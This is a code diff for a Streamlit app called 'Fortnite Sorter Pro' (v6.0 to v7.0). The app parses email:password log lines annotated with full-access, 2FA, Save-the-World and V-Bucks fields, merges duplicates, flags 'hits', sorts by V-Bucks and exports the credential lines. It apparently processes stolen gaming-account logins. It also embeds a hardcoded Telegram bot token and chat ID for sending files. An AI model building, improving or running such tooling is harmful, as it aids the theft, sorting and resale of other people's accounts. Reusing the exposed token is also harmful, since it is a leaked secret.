@@ -13,7 +13,7 @@ import shutil
 import streamlit.components.v1 as components
 
 # --- Configuration ---
-SCRIPT_VERSION = "6.0"  # Increment to force update
+SCRIPT_VERSION = "7.0"  # Increment to force cache reset
 DEFAULT_TG_TOKEN = "8320526788:AAECI8pPkEqUOEV3JaAz8VEVoLDKfnY2BCY"
 DEFAULT_CHAT_ID = "-1003446261251"
 
@@ -58,7 +58,7 @@ def send_telegram_document(token, chat_id, file_buffer, filename, caption=""):
     except Exception as e:
         return {"ok": False, "description": str(e)}
 
-# --- Parser Logic (STRICTLY FROM OLD SORTER) ---
+# --- Parser Logic (EXACT COPY FROM UPLOADED OLD SCRIPT) ---
 class FortniteAccountParser:
     def __init__(self):
         self.accounts = defaultdict(dict)
@@ -73,7 +73,7 @@ class FortniteAccountParser:
             return None
         
         account = {}
-        # 1. Credentials (Email:Pass) - Exact regex from old sorter
+        # 1. Credentials
         email_pass_match = re.match(r'([a-zA-Z0-9._-]+@[a-zA-Z0-9._-]+\.[a-zA-Z0-9._-]+):([^|\s]+)', line)
         if not email_pass_match:
             return None
@@ -83,14 +83,13 @@ class FortniteAccountParser:
         
         remaining = line[email_pass_match.end():].strip()
         
-        # Helper extraction functions
         def normalize_bool(value):
             if isinstance(value, str):
                 lower = value.lower()
                 return 'Yes' if lower in ('yes', 'true', '1') else 'No'
             return 'Yes' if value else 'No'
 
-        # 2. Extract Fields (Using EXACT regex patterns from old sorter)
+        # --- REGEX PATTERNS FROM OLD SCRIPT ---
         
         # FA
         fa_match = re.search(r'FA:\s*(Yes|No|True|False|1|0)', remaining, re.IGNORECASE)
@@ -104,18 +103,27 @@ class FortniteAccountParser:
         stw_match = re.search(r'STW:\s*(Yes|No|True|False|1|0)', remaining, re.IGNORECASE)
         account['stw'] = normalize_bool(stw_match.group(1)) if stw_match else 'No'
         
-        # V-Bucks
+        # V-Bucks (Modified slightly to allow commas "1,050" which old script might miss)
         vbucks_match = re.search(r'(Vbucks Count|V-Bucks|Vbucks):\s*([\d,]+)', remaining, re.IGNORECASE)
-        # Handle comma in vbucks if present (improvement over old script's potential crash on commas)
         account['vbucks'] = int(vbucks_match.group(2).replace(',', '')) if vbucks_match else 0
         
-        # Skins Count
+        # Skins Count (Note: No re.IGNORECASE in old script for this)
         skins_count_match = re.search(r'Skins:\s*\[(\d+)\]', remaining)
         account['skins'] = int(skins_count_match.group(1)) if skins_count_match else 0
         
-        # Skin Names - EXACT OLD LOGIC
+        # Skin Names (Note: No re.IGNORECASE in old script for this)
+        # It looks for: Skins: [123]: Skin1, Skin2
         skins_names_match = re.search(r'Skins:\s*\[\d*\]:\s*(.+?)(?=\s*\||$)', remaining)
         account['skin_names'] = [name.strip() for name in skins_names_match.group(1).split(',')] if skins_names_match else []
+
+        # Fallback for Skin Names if strict format fails (Safety Net)
+        if not account['skin_names'] and account['skins'] > 0:
+             # Try grabbing text after "Skins:" even if brackets are missing
+             fallback_match = re.search(r'Skins:\s*(?![\[])(.+?)(?=\s*\||$)', remaining)
+             if fallback_match:
+                 potential = fallback_match.group(1).split(',')
+                 # Basic filter to avoid grabbing numbers
+                 account['skin_names'] = [n.strip() for n in potential if not n.strip().isdigit()]
 
         # Last Played
         last_played_match = re.search(r'Last Played:\s*([^|]+)', remaining)
@@ -125,11 +133,11 @@ class FortniteAccountParser:
         username_match = re.search(r'Username:\s*([^|]+)', remaining)
         account['username'] = username_match.group(1).strip() if username_match else 'Unknown'
         
-        # Matches Played
+        # Matches Played (Old Script Pattern)
         matches_match = re.search(r'Matches Played:\s*(\d+)', remaining, re.IGNORECASE)
+        # Fallback if "Played" is missing in newer logs
         if not matches_match:
-             # Fallback for newer logs that might just say "Matches:"
-             matches_match = re.search(r'Matches:\s*(\d+)', remaining, re.IGNORECASE)
+            matches_match = re.search(r'Matches:\s*(\d+)', remaining, re.IGNORECASE)
         account['matches_played'] = int(matches_match.group(1)) if matches_match else 0
         
         # Points
@@ -144,15 +152,15 @@ class FortniteAccountParser:
         level_match = re.search(r'Level:\s*(\d+)', remaining)
         account['level'] = int(level_match.group(1)) if level_match else 0
         
-        # Is Hit?
+        # Hit Check
         account['is_hit'] = (account['fa'] == 'Yes' and account['stw'] == 'Yes')
         
         return account
 
     def merge_account(self, existing, new):
         """
-        SMART MERGE: Directly from old script logic.
-        Combines data so nothing is lost.
+        SMART MERGE: Logic from old script.
+        Combines data from multiple files for the same email.
         """
         for key, value in new.items():
             # Numeric fields: Keep the higher value
@@ -165,9 +173,10 @@ class FortniteAccountParser:
                 if len(value) > len(existing.get(key, [])):
                     existing[key] = value
             
-            # Strings: Update if "Unknown" or if new value exists
+            # Strings: Update if "Unknown" or if new value is present
             elif key in ('last_played', 'username', 'platform'):
-                if value != 'Unknown' and existing.get(key, 'Unknown') == 'Unknown':
+                if value != 'Unknown':
+                    # If existing is unknown, take new. If both exist, take new (assuming fresher scan).
                     existing[key] = value
             
             # Booleans: If 'Yes' is found, keep it (Upgrade 'No' to 'Yes')
@@ -179,19 +188,19 @@ class FortniteAccountParser:
         existing['is_hit'] = (existing.get('fa') == 'Yes' and existing.get('stw') == 'Yes')
 
     def process_directory(self, root_dir):
-        # Walk through all files
+        # Recursive walk (Better than old script's flat listdir)
         for root, _, files in os.walk(root_dir):
             for file in files:
                 if file.endswith('.txt'):
                     try:
-                        # errors='ignore' ensures we don't crash on bad bytes, same as old script
+                        # errors='ignore' matches old script behavior to skip bad chars
                         with open(os.path.join(root, file), 'r', encoding='utf-8', errors='ignore') as f:
                             for line in f:
                                 p = self.parse_line(line)
                                 if p:
                                     email = p['email']
                                     if email in self.accounts:
-                                        # THIS IS THE KEY: MERGE, DON'T OVERWRITE
+                                        # MERGE existing data
                                         self.merge_account(self.accounts[email], p)
                                     else:
                                         self.accounts[email] = p
@@ -210,25 +219,24 @@ class FortniteAccountParser:
 
     def get_txt_string(self):
         output = io.StringIO()
-        # Sort by Vbucks High -> Low by default
+        # Sort by Vbucks High -> Low
         sorted_accs = sorted(self.accounts.values(), key=lambda x: x.get('vbucks', 0), reverse=True)
         
         output.write(f"Generated by Fortnite Sorter Pro - {datetime.now().strftime('%Y-%m-%d %H:%M')}\n")
         output.write("==================================================\n\n")
         
         for acc in sorted_accs:
-            # Build Skins Section exactly like old format if possible
+            skin_sec = f"Skins: [{acc['skins']}]"
             if acc['skin_names']:
                 skin_str = ", ".join(acc['skin_names'])
+                # Reconstruct format: Skins: [Count]: Name1, Name2
                 skin_sec = f"Skins: [{acc['skins']}]: {skin_str}"
-            else:
-                skin_sec = f"Skins: [{acc['skins']}]"
 
-            # Reconstruct the line format
             line = (
                 f"{acc['email']}:{acc['password']} | "
                 f"Vbucks: {acc['vbucks']} | "
                 f"FA: {acc['fa']} | "
+                f"2FA: {acc['twofa']} | "
                 f"STW: {acc['stw']} | "
                 f"Level: {acc['level']} | "
                 f"Matches Played: {acc['matches_played']} | "
@@ -264,12 +272,15 @@ def render_html_view(accounts_json):
         .email {{ background: #0003; padding: 5px 10px; border-radius: 4px; font-family: monospace; cursor: pointer; border: 1px solid #ffffff05; max-width: 220px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }}
         .email:active {{ color: var(--accent); border-color: var(--accent); }}
         
+        /* Stats Row */
         .stats {{ display: flex; background: #ffffff05; border-radius: 5px; padding: 8px; }}
         .stat {{ flex: 1; text-align: center; border-right: 1px solid #ffffff05; }}
         .stat:last-child {{ border-right: none; }}
         .stat-val {{ font-weight: 700; }}
         .stat-lbl {{ font-size: 0.7em; color: #888; text-transform: uppercase; }}
-        .yes {{ color: var(--green); }} .no {{ color: var(--red); }}
+        
+        .yes {{ color: var(--green); }} 
+        .no {{ color: var(--red); }}
         
         .skins {{ font-size: 0.85em; color: #aaa; background: #0003; padding: 8px; border-radius: 4px; max-height: 80px; overflow-y: auto; line-height: 1.4; }}
         .skins::-webkit-scrollbar {{ width: 4px; }}
@@ -300,7 +311,7 @@ def render_html_view(accounts_json):
                 if(!items.length) {{ grid.innerHTML = '<div style="grid-column:1/-1;text-align:center;padding:30px;color:#555">No accounts found.</div>'; return; }}
                 
                 items.forEach(acc => {{
-                    let skinsTxt = acc.skin_names.length ? acc.skin_names.join(", ") : (acc.skins > 0 ? `Count: ${{(acc.skins)}} (Names not parsed)` : "None");
+                    let skinsTxt = acc.skin_names.length ? acc.skin_names.join(", ") : (acc.skins > 0 ? `Count: ${{(acc.skins)}} (Names missing)` : "None");
                     let card = document.createElement('div');
                     card.className = 'card';
                     card.innerHTML = `
@@ -310,9 +321,9 @@ def render_html_view(accounts_json):
                         </div>
                         <div class="stats">
                             <div class="stat"><div class="stat-val ${{acc.fa=='Yes'?'yes':'no'}}">${{acc.fa}}</div><div class="stat-lbl">FA</div></div>
+                            <div class="stat"><div class="stat-val ${{acc.twofa=='Yes'?'yes':'no'}}">${{acc.twofa}}</div><div class="stat-lbl">2FA</div></div>
                             <div class="stat"><div class="stat-val ${{acc.stw=='Yes'?'yes':'no'}}">${{acc.stw}}</div><div class="stat-lbl">STW</div></div>
                             <div class="stat"><div class="stat-val" style="color:#fff">${{acc.skins}}</div><div class="stat-lbl">Skins</div></div>
-                            ${{acc.level > 0 ? `<div class="stat"><div class="stat-val">${{acc.level}}</div><div class="stat-lbl">Lvl</div></div>` : ''}}
                         </div>
                         <div class="skins" title="${{skinsTxt}}"><i class="fas fa-tshirt" style="margin-right:5px;opacity:0.6"></i> ${{skinsTxt}}</div>
                         <div class="footer"><span>Matches: ${{acc.matches_played}}</span><span>${{acc.last_played}}</span></div>
@@ -347,7 +358,7 @@ def main():
             st.session_state.clear()
             st.rerun()
 
-    st.title("⚡ Fortnite Sorter Pro v6.0")
+    st.title("⚡ Fortnite Sorter Pro v7.0")
     
     if st.session_state.processed_accounts is None:
         uploaded_file = st.file_uploader("📂 Upload ZIP file", type="zip")
